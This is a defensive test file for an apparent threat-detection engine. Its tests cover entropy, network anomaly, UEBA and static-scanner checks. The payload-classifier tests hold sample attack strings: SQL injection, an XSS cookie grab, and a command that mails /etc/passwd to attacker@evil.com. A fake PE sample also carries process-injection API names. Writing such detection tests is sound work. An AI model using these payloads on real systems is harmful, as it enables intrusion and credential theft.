"""Unit and integration tests for CyberShield AI Threat Detection Engines."""

import pytest
import numpy as np
from cybershield.core.models import NetworkFlow, NormalizedEvent, LogSourceType
from cybershield.engines.anomaly import anomaly_engine, FlowFeatureExtractor
from cybershield.engines.ueba import ueba_engine
from cybershield.engines.payload import payload_engine
from cybershield.engines.static_scanner import static_scanner
from cybershield.core.crypto import calculate_shannon_entropy


def test_shannon_entropy_calculation():
    """Verify entropy behaves accurately: low for uniform, high for random/compressed bytes."""
    zero_entropy = calculate_shannon_entropy("AAAAAAA")
    assert zero_entropy == 0.0

    english_text = "The quick brown fox jumps over the lazy dog."
    english_entropy = calculate_shannon_entropy(english_text)
    assert 3.5 <= english_entropy <= 5.0

    # Highly random / encrypted simulated bytes
    random_bytes = bytes([i % 256 for i in range(10000)])
    high_entropy = calculate_shannon_entropy(random_bytes)
    assert high_entropy >= 7.8


def test_isolation_forest_anomaly_detection():
    """Verify normal flows pass and extreme anomalous flows trigger alerts."""
    normal_flow = NetworkFlow(
        source_ip="192.168.1.50",
        destination_ip="10.0.1.10",
        source_port=52140,
        destination_port=443,
        protocol="TCP",
        bytes_sent=1500,
        bytes_received=45000,
        packets_sent=20,
        packets_received=40,
        duration_ms=450.0,
        tcp_flags=["ACK"],
        byte_entropy=4.2,
    )
    is_anomaly, score, details = anomaly_engine.evaluate_flow(normal_flow)
    assert score < 85.0

    # Anomalous flow: extreme high-entropy outbound blast
    anomalous_flow = NetworkFlow(
        source_ip="192.168.1.99",
        destination_ip="198.51.100.23",
        source_port=60120,
        destination_port=8443,
        protocol="TCP",
        bytes_sent=50000000,  # 50MB outbound
        bytes_received=120,
        packets_sent=40000,
        packets_received=2,
        duration_ms=1200.0,
        tcp_flags=["SYN"],
        byte_entropy=7.95,  # High encryption entropy
    )
    alert = anomaly_engine.process_and_alert(anomalous_flow)
    assert alert is not None
    assert alert.severity.value in ["HIGH", "CRITICAL"]
    assert "Exfiltration" in alert.mitre_tactics or "T1048.003" in alert.mitre_techniques


def test_payload_classifier_sqli_and_xss():
    """Verify NLP and heuristic classifier detects SQLi and XSS while passing benign."""
    is_attack, cat, conf, _ = payload_engine.inspect_payload("1' OR '1'='1")
    assert is_attack is True
    assert cat == "SQL_INJECTION"
    assert conf >= 0.80

    is_attack, cat, conf, _ = payload_engine.inspect_payload("<script>alert(document.cookie)</script>")
    assert is_attack is True
    assert cat == "CROSS_SITE_SCRIPTING"
    assert conf >= 0.80

    is_attack, cat, conf, _ = payload_engine.inspect_payload("; cat /etc/passwd | mail attacker@evil.com")
    assert is_attack is True
    assert cat == "COMMAND_INJECTION_RCE"
    assert conf >= 0.80

    # Benign string
    is_attack, cat, conf, _ = payload_engine.inspect_payload("department=finance&year=2026&report=quarterly")
    assert is_attack is False
    assert cat == "BENIGN"


def test_ueba_impossible_travel():
    """Verify impossible travel alert when user logs in from two distant geographic locations rapidly."""
    # First login in New York
    evt1 = NormalizedEvent(
        log_source=LogSourceType.WINDOWS_EVENT,
        user_name="jsmith_exec",
        source_ip="10.0.1.5",  # New York geo
        host_name="ws-ny-01.corp",
    )
    ueba_engine.evaluate_event(evt1)

    # Second login from Tokyo 10 seconds later
    evt2 = NormalizedEvent(
        log_source=LogSourceType.WINDOWS_EVENT,
        user_name="jsmith_exec",
        source_ip="10.0.3.50",  # Tokyo geo
        host_name="vpn-gateway.corp",
    )
    risk_score, indicators, details = ueba_engine.evaluate_event(evt2)
    assert risk_score >= 60.0
    assert any("Impossible Travel" in ind for ind in indicators)


def test_static_file_scanner():
    """Verify static scanner identifies packed PE binary characteristics and suspicious APIs."""
    sample_pe = b"MZ" + b"\x00" * 58 + b"\x80\x00\x00\x00" + b"\x00" * 60 + b"PE\x00\x00"
    # Inject suspicious APIs into binary text
    sample_pe += b"VirtualAlloc CreateRemoteThread WriteProcessMemory CryptEncrypt"
    report = static_scanner.scan_bytes(sample_pe, filename="dropper_sample.exe")
    assert "VirtualAlloc" in report.suspicious_apis
    assert "CreateRemoteThread" in report.suspicious_apis
    assert report.file_type == "PE_WINDOWS_EXECUTABLE"
